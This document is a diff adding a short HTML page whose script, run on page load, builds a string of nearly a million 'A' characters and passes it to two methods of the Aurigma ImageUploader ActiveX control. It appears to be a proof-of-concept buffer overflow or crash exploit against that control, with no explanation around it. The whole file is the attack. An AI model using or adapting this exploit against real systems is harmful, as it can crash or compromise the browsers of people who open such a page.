@@ -1,0 +1,19 @@
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+    function Check() {
+    var s = "AAAA";
+
+     while (s.length < 999999) s=s+s;
+
+     var obj = new ActiveXObject("Aurigma.ImageUploader.4.1"); //{6E5E167B-1566-4316-B27F-0DDAB3484CF7}
+      obj.GotoFolder(s);
+      obj.CanGotoFolder(s);
+
+   }
+  </script>
+
+ </head>
+ <body onload="JavaScript: return Check();">
+ </body>
+</html>
